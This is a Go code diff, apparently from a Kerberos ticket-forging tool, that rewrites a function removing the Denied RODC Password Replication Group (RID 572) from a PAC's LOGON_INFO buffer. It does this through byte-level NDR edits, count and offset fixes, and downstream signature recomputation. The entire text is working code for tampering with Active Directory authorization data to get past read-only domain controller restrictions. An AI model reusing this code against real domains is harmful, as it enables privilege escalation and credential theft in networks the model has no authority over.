@@ -971,24 +971,22 @@ func ClearExtraSids(pacData []byte) ([]byte, int) {
 	return newPAC, 1
 }
 
-// StripDeniedRODCGroup substitutes the RID 572 (Denied RODC Password
-// Replication Group) GROUP_MEMBERSHIP entry in LOGON_INFO with a duplicate
-// of RID 513 (Domain Users).
+// StripDeniedRODCGroup removes the RID 572 (Denied RODC Password
+// Replication Group) GROUP_MEMBERSHIP entry from the PAC's LOGON_INFO
+// buffer via proper NDR-level edits:
+//   1. Find the GroupIds conformant array (MaxCount + entries) in deferred data
+//   2. Find the RID 572 entry within the array
+//   3. Find GroupCount in the fixed struct (matching MaxCount, preceding a
+//      pointer referent and UserFlags)
+//   4. Decrement GroupCount (fixed) and MaxCount (deferred) from N to N-1
+//   5. Remove the 8-byte entry; shift subsequent LOGON_INFO bytes left by 8
+//   6. Shrink LOGON_INFO internal NDR body-size field by 8
+//   7. Shrink LOGON_INFO buffer size in the PAC header by 8
+//   8. Shift all subsequent PAC buffer offsets by -8
 //
-// True removal requires decrementing GroupCount in KERB_VALIDATION_INFO,
-// decrementing the conformant array MaxCount prefix, and shifting subsequent
-// NDR deferred data left by 8 bytes — non-trivial. Zeroing the entry breaks
-// the PAC (KDC rejects RID=0 with KRB_ERR_GENERIC).
+// Signatures are recomputed downstream. Safe only for N <= 10 groups.
 //
-// Substituting 572 → 513 preserves PAC structural validity: the entry is
-// still a valid GROUP_MEMBERSHIP with a well-known benign RID. Duplicate
-// group entries (513 appearing twice) are tolerated by Windows PAC consumers
-// (deduplicated during access-token construction).
-//
-// Scoped to LOGON_INFO buffer only to avoid false-matches on stray uint32
-// values. Attributes (4 bytes following the RID) are preserved unchanged.
-//
-// Returns the modified PAC bytes and the number of substitutions performed.
+// Returns the modified PAC bytes and 1 if the entry was removed, 0 otherwise.
 func StripDeniedRODCGroup(pacData []byte) ([]byte, int) {
 	parsed, err := ParsePACForSigning(pacData)
 	if err != nil {
@@ -998,24 +996,154 @@ func StripDeniedRODCGroup(pacData []byte) ([]byte, int) {
 	if logonBuf == nil {
 		return pacData, 0
 	}
-	out := make([]byte, len(pacData))
-	copy(out, pacData)
-	count := 0
-	// RID 572 little-endian uint32 = 3c 02 00 00
-	// Replacement RID 513 (Domain Users) little-endian uint32 = 01 02 00 00
-	target := []byte{0x3c, 0x02, 0x00, 0x00}
-	replacement := []byte{0x01, 0x02, 0x00, 0x00}
 	bufStart := int(logonBuf.Offset)
 	bufEnd := bufStart + int(logonBuf.Size)
-	// Walk on 4-byte boundaries; GROUP_MEMBERSHIP entries are uint32-aligned.
+
+	// Step 1: locate the RID 572 entry directly by byte pattern.
+	// A GROUP_MEMBERSHIP entry is 8 bytes: {uint32 RelativeId, uint32 Attributes}.
+	// RID 572 = 0x0000023C. Attributes can be:
+	//   0x00000007 - GroupIds entry (SE_GROUP_MANDATORY | ENABLED_BY_DEFAULT | ENABLED)
+	//   0x20000007 - ResourceGroupIds entry (adds SE_GROUP_RESOURCE)
+	// S4U2Self PACs typically place the Denied-RODC group in ResourceGroupIds.
+	targetEntryOff := -1
+	var entryAttrs uint32
 	for i := bufStart; i+8 <= bufEnd; i += 4 {
-		if bytes.Equal(out[i:i+4], target) {
-			// Rewrite just the RID field; leave the 4-byte Attributes intact.
-			copy(out[i:i+4], replacement)
-			count++
+		rid := binary.LittleEndian.Uint32(pacData[i:])
+		if rid != 572 {
+			continue
+		}
+		attrs := binary.LittleEndian.Uint32(pacData[i+4:])
+		if attrs != 0x00000007 && attrs != 0x20000007 {
+			continue
+		}
+		targetEntryOff = i
+		entryAttrs = attrs
+		break
+	}
+	if targetEntryOff < 0 {
+		return pacData, 0
+	}
+
+	// Step 2: count group entries after RID 572 sharing the same attrs.
+	entriesAfter := 0
+	for off := targetEntryOff + 8; off+8 <= bufEnd && entriesAfter < 20; off += 8 {
+		rid := binary.LittleEndian.Uint32(pacData[off:])
+		attrs := binary.LittleEndian.Uint32(pacData[off+4:])
+		if attrs != entryAttrs || rid == 0 || rid >= 1<<30 {
+			break
+		}
+		entriesAfter++
+	}
+
+	// Step 3: walk backward from RID 572 to find MaxCount.
+	arrayMaxCountPos := -1
+	numEntries := 0
+	for k := 0; k < 20; k++ {
+		firstEntryOff := targetEntryOff - k*8
+		mcPos := firstEntryOff - 4
+		if mcPos < bufStart {
+			break
+		}
+		mc := binary.LittleEndian.Uint32(pacData[mcPos:])
+		expected := uint32(k + 1 + entriesAfter)
+		if mc != expected {
+			continue
+		}
+		valid := true
+		for j := 0; j < k; j++ {
+			eOff := firstEntryOff + j*8
+			attrs := binary.LittleEndian.Uint32(pacData[eOff+4:])
+			if attrs != entryAttrs {
+				valid = false
+				break
+			}
+		}
+		if !valid {
+			continue
+		}
+		arrayMaxCountPos = mcPos
+		numEntries = int(expected)
+		break
+	}
+	if arrayMaxCountPos < 0 {
+		return pacData, 0
+	}
+
+	// Step 4: find the Count field in the fixed struct (GroupCount if attrs=0x7,
+	// ResourceGroupCount if attrs=0x20000007). Both patterns share:
+	//   [uint32 count == numEntries] [uint32 ptr: non-zero referent, high byte 0]
+	// Scan [bufStart+16, arrayMaxCountPos), take the LAST match (closest to the
+	// array — ResourceGroupCount is the last uint32 in the fixed struct, and
+	// GroupCount is also late in the fixed struct).
+	countPos := -1
+	expectedCount := uint32(numEntries)
+	for i := bufStart + 16; i+8 <= arrayMaxCountPos; i += 4 {
+		cnt := binary.LittleEndian.Uint32(pacData[i:])
+		ptr := binary.LittleEndian.Uint32(pacData[i+4:])
+		if cnt != expectedCount {
+			continue
+		}
+		if ptr == 0 || ptr&0xFF000000 != 0 {
+			continue
+		}
+		countPos = i
+	}
+	if countPos < 0 {
+		return pacData, 0
+	}
+
+	// Step 5: build new PAC. Two paths depending on whether removing this entry
+	// empties the array:
+	//   - removeWholeArray (numEntries==1): delete 12 bytes total
+	//     (MaxCount 4 + entry 8). Set count=0 and nullify the array pointer
+	//     at (countPos+4).
+	//   - decrementOnly: delete 8 bytes (entry only), decrement count +
+	//     MaxCount by 1.
+	var newPAC []byte
+	var bytesRemoved int
+	if numEntries == 1 {
+		bytesRemoved = 12
+		newPAC = make([]byte, 0, len(pacData)-12)
+		newPAC = append(newPAC, pacData[:countPos]...)
+		zero := []byte{0, 0, 0, 0}
+		newPAC = append(newPAC, zero...) // count = 0
+		newPAC = append(newPAC, zero...) // array ptr = NULL
+		newPAC = append(newPAC, pacData[countPos+8:arrayMaxCountPos]...)
+		newPAC = append(newPAC, pacData[arrayMaxCountPos+4+8:]...) // skip MaxCount + entry
+	} else {
+		bytesRemoved = 8
+		newPAC = make([]byte, 0, len(pacData)-8)
+		newPAC = append(newPAC, pacData[:countPos]...)
+		newCount := make([]byte, 4)
+		binary.LittleEndian.PutUint32(newCount, expectedCount-1)
+		newPAC = append(newPAC, newCount...)
+		newPAC = append(newPAC, pacData[countPos+4:arrayMaxCountPos]...)
+		newPAC = append(newPAC, newCount...) // MaxCount matches count
+		newPAC = append(newPAC, pacData[arrayMaxCountPos+4:targetEntryOff]...)
+		newPAC = append(newPAC, pacData[targetEntryOff+8:]...)
+	}
+
+	// Step 6: update the LOGON_INFO internal NDR body-size field
+	// (4 bytes at buffer offset 8, within the 16-byte NDR common header).
+	bodySizePos := bufStart + 8
+	bodySize := binary.LittleEndian.Uint32(newPAC[bodySizePos:])
+	binary.LittleEndian.PutUint32(newPAC[bodySizePos:], bodySize-uint32(bytesRemoved))
+
+	// Step 7: update PAC buffer-info entries.
+	cBuffers := binary.LittleEndian.Uint32(newPAC[0:4])
+	for i := uint32(0); i < cBuffers; i++ {
+		entryOff := 8 + int(i)*16
+		bt := binary.LittleEndian.Uint32(newPAC[entryOff:])
+		bs := binary.LittleEndian.Uint32(newPAC[entryOff+4:])
+		bo := binary.LittleEndian.Uint64(newPAC[entryOff+8:])
+		if bt == LogonInfoType {
+			binary.LittleEndian.PutUint32(newPAC[entryOff+4:], bs-uint32(bytesRemoved))
+		} else if int(bo) > bufStart {
+			binary.LittleEndian.PutUint64(newPAC[entryOff+8:], bo-uint64(bytesRemoved))
 		}
 	}
-	return out, count
+
+	return newPAC, 1
 }
 
 // UserFlags bits in KERB_VALIDATION_INFO (MS-PAC 2.5)
